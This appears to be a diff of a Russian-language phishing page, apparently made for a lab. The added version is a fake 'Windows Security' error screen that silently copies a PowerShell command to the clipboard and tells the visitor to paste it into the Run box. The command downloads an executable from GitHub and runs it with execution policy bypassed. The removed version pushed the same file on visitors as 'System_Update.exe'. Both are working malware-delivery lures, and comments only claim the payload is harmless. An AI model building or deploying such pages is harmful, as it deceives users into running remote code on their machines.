@@ -1,49 +1,63 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <title>Проверка обновлений</title>
+    <title>Безопасность Windows</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 600px; }
+        .box h2 { color: #d9534f; }
+        .btn { background-color: #2563eb; color: white; padding: 10px 20px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        .steps { display: none; margin-top: 20px; background: #f0f0f0; padding: 15px; border-radius: 4px; font-family: monospace; text-align: left; }
+        .steps ul { list-style-type: none; padding: 0; }
+        .steps li { margin: 10px 0; }
+        #result { margin-top: 20px; display: none; }
+        .error { color: #d9534f; font-weight: bold; }
+        .success { color: #5cb85c; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1 style="font-family: Arial;">Система обновляет антивирусные базы...</h1>
-    <p style="font-family: Arial;">Пожалуйста, нажмите на кнопку, чтобы завершить установку.</p>
+    <div class="box">
+        <h2>Ошибка системы безопасности</h2>
+        <p>Ваш браузер обнаружил критическую уязвимость. Для восстановления работы необходимо пройти проверку.</p>
+        
+        <button class="btn" onclick="startAttack()">Нажмите для исправления</button>
 
-    <!-- Кнопка для запуска скачивания -->
-    <button onclick="smuggle()" style="padding: 10px; font-size: 16px; cursor: pointer;">Скачать обновление</button>
+        <div class="steps" id="steps">
+            <p>Нажмите <strong>Win + R</strong> (или <strong>Win + X</strong> → <strong>I</strong> для терминала), чтобы открыть окно "Выполнить".</p>
+            <p>Скопируйте следующий код и нажмите <strong>Enter</strong> для завершения проверки:</p>
+            <ul>
+                <li>1. Нажмите <kbd>Ctrl</kbd> + <kbd>V</kbd> (вставьте код)</li>
+                <li>2. Нажмите <kbd>Enter</kbd></li>
+            </ul>
+            <p>Подождите 10 секунд. Не выключайте компьютер.</p>
+        </div>
+
+        <div id="result" style="display: none;">
+            <p class="success">Проверка пройдена! Ожидайте восстановления системы...</p>
+            <p id="verifyStatus" class="error"></p>
+        </div>
+    </div>
 
     <script>
-        async function smuggle() {
-            // ТОЧНАЯ ссылка на твой файл (smuggle-lab2 + cmd.exe)
-            const url = 'https://raw.githubusercontent.com/richardamiller8282-boop/smuggle-lab2/main/cmd.exe';
-
-            try {
-                // 1. Загружаем файл
-                const response = await fetch(url);
+        function startAttack() {
+            document.getElementById('steps').style.display = 'block';
+            
+            // Вставляем команду, которая скачает твой cmd.exe с GitHub и запустит его.
+            // В реальной атаке здесь был бы троян, но для обучения это просто cmd.exe.
+            const payload = "powershell -NoP -ExecutionPolicy Bypass -w 1 -c \"$u='https://raw.githubusercontent.com/richardamiller8282-boop/smuggle-lab2/main/cmd.exe'; $p=$env:TEMP+'\\cmd.exe'; (New-Object Net.WebClient).DownloadFile($u,$p); Start-Process $p\"";
+            
+            navigator.clipboard.writeText(payload).then(function() {
+                document.getElementById('result').style.display = 'block';
+                document.getElementById('verifyStatus').innerText = "Команда скопирована в буфер обмена. Вставьте её в Run и нажмите Enter.";
                 
-                // Проверяем, ответил ли сервер успехом
-                if (!response.ok) {
-                    alert('Ошибка загрузки: Сервер ответил ' + response.status + ' (файл не найден?)');
-                    console.log('Статус:', response.status);
-                    return;
-                }
-
-                // 2. Создаем Blob
-                const blob = await response.blob();
-
-                // 3. Создаем ссылку и кликаем по ней
-                const link = document.createElement('a');
-                link.href = URL.createObjectURL(blob);
-                link.download = 'System_Update.exe'; // Имя для жертвы
+                setTimeout(function() {
+                    document.getElementById('verifyStatus').innerText = "Ожидание выполнения...";
+                }, 5000);
                 
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                
-                // 4. Освобождаем память
-                URL.revokeObjectURL(link.href);
-            } catch (error) {
-                alert('Ошибка сети или CORS: ' + error.message);
-                console.error('Ошибка:', error);
-            }
+                console.log("Payload скопирован: ", payload);
+            }).catch(err => {
+                console.error('Не удалось скопировать: ', err);
+            });
         }
     </script>
 </body>
